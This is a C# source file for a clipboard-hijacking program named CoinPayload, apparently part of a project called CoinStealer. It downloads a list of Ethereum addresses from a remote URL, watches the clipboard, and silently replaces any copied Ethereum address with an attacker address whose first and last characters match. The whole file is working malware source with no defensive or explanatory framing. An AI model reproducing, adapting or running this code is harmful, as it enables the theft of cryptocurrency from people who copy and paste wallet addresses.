﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace CoinPayload
{
    public static class Program
    {
        /// <summary>
        /// Ethereum Address Pattern
        /// </summary>
        static Regex Pattern = new Regex(@"(0X[a-f0-9]{40})", RegexOptions.IgnoreCase | RegexOptions.ExplicitCapture | RegexOptions.Multiline);
        /// <summary>
        /// Dictionary for search the replacement address
        /// </summary>
        static Dictionary<string, string> Changes = new Dictionary<string, string>();

        class HttpHandler : WebClient
        {
            CookieContainer _mContainer = new CookieContainer();

            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address);
                if (request is HttpWebRequest h)
                {
                    h.AllowAutoRedirect = true;
                    h.CookieContainer = _mContainer;
                }
                return request;
            }

            protected override WebResponse GetWebResponse(WebRequest request)
            {
                var response = base.GetWebResponse(request);
                if (response is HttpWebResponse h)
                {
                    _mContainer.Add(h.Cookies);
                }
                return response;
            }

            public void ClearCookies() { _mContainer = new CookieContainer(); }
        }

        [STAThread]
        static void Main(string[] args)
        {
#if DEBUG
            if (Debugger.IsAttached)
            {
                args = new string[] { "https://github.com/shargon/CoinStealer/blob/master/CoinStealer/Samples/Addresses.txt?raw=true" };
            }
#endif
            // Check parameter
            if (args.Length == 0) return;
            if (!Uri.TryCreate(args[0], UriKind.RelativeOrAbsolute, out Uri uri)) return;

            // Download address list
            using (HttpHandler wb = new HttpHandler())
            {
                foreach (string dir in wb.DownloadString(uri).Split(new char[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries))
                    try
                    {
                        string sdir = dir;

                        if (!dir.StartsWith("0x", StringComparison.InvariantCultureIgnoreCase))
                            sdir = "0x" + sdir;

                        string sub = sdir.Substring(0, 4) + sdir.Substring(sdir.Length - 2, 2);
                        Changes[sub] = sdir;
                    }
                    catch { }
            }

            // Create a dummy control for intercept windows message
            ClipboardMonitor c = new ClipboardMonitor();
            c.ClipboardChanged += C_ClipboardChanged;
            Application.Run();
        }
        /// <summary>
        /// Clipboard changed event
        /// </summary>
        static void C_ClipboardChanged()
        {
            if (!Clipboard.ContainsText()) return;

            // Extract clipboard text
            bool change = false;
            string t = Clipboard.GetText();
            // Search address path
            foreach (Match m in Pattern.Matches(t))
            {
                string sub = m.Value.Substring(0, 4) + m.Value.Substring(m.Value.Length - 2, 2).ToLowerInvariant();

                // Search my replacement :)
                if (Changes.TryGetValue(sub, out string sc) && sc != m.Value)
                {
                    t = t.Replace(m.Value, sc);
                    change = true;
                }
            }

            if (change)
            {
                // Change it!
                Clipboard.SetText(t);
            }
        }
    }
}